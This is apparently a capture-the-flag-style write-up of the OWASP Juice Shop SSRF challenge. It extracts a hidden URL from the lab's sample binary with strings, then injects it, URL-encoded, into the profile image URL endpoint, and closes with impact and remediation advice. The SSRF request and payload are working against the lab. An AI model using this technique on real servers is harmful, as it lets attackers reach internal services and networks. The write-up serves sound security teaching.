# OWASP Juice Shop — SSRF Challenge Writeup

| | |
|---|---|
| **Platform** | OWASP Juice Shop (Local Lab) |
| **Vulnerability** | Server-Side Request Forgery (SSRF) |
| **Severity** | High |
| **Date** | November 2026 |
| **Author** | CRUSH-HUNTER |

## 1. Challenge Description

The goal of this challenge is to perform an SSRF attack by making the Juice
Shop server send a request to **itself**. The challenge requires reverse
engineering a provided "malware" binary to extract a hidden URL, then
injecting that URL into a vulnerable endpoint.

## 2. Reverse Engineering the Malware

### 2.1 Obtaining the Binary

The challenge provides a malicious binary. Instead of searching for the
source code on GitHub, classic reverse engineering was performed using the
`strings` command:

```bash
strings juicy_malware_linux_amd_64 | grep -E "https?://"
```

### 2.2 Extracting the Hidden URL

The `strings` command revealed the following hidden URL embedded in the
binary:

```
http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```

This URL points to a local endpoint that marks the SSRF challenge as solved.

## 3. Exploiting the SSRF Vulnerability

### 3.1 Identifying the Vulnerable Endpoint

By analyzing application traffic with Burp Suite, the following endpoint was
identified:

```http
POST /profile/image/url HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer <JWT_TOKEN>

imageUrl=https%3A%2F%2Fexample.com%2Ftext.jpg
```

This endpoint allows users to update their profile image by providing a URL.
The server fetches the image from the provided URL without proper
validation.

### 3.2 Crafting the Payload

The `imageUrl` parameter was replaced with the hidden URL extracted from the
malware binary. Since the request body is `x-www-form-urlencoded`, the
payload was URL-encoded:

```
imageUrl=http%3A%2F%2Flocalhost%3A3000%2Fsolve%2Fchallenges%2Fserver-side%3Fkey%3DtRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```

### 3.3 Executing the Attack

Sending the modified request via Burp Suite Repeater resulted in a
successful SSRF attack. The Juice Shop server initiated a request to itself,
triggering the hidden endpoint and solving the challenge.

## 4. Impact

If exploited in a real-world application, this SSRF vulnerability could
allow an attacker to:

- Scan internal networks (e.g., `192.168.x.x`, `10.x.x.x`)
- Access internal services (e.g., databases, admin panels) not exposed to
  the internet
- Bypass firewall restrictions
- Potentially achieve Remote Code Execution (RCE) if internal services are
  vulnerable

## 5. Remediation

To prevent SSRF vulnerabilities, developers should:

1. **Avoid using user-supplied URLs directly.** Use an allowlist of
   permitted domains.
2. **Validate and sanitize input.** Block private IP addresses (e.g.,
   `127.0.0.1`, `192.168.0.0/16`) and internal hostnames.
3. **Use a dedicated proxy** for fetching external resources, with strict
   network policies.
4. **Disable unnecessary URL schemas** (e.g., `file://`, `gopher://`,
   `dict://`).

## 6. Lessons Learned

- **Reverse engineering is a powerful skill.** Even without source code,
  tools like `strings` can reveal critical information.
- **Always inspect the request body.** The vulnerability was hidden in a
  specific parameter (`imageUrl`) and required precise URL encoding.
- **SSRF is often overlooked.** It's a high-impact vulnerability that can
  lead to severe data breaches.

## 7. References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [Juice Shop Official Documentation](https://pwning.owasp-juice.shop/)
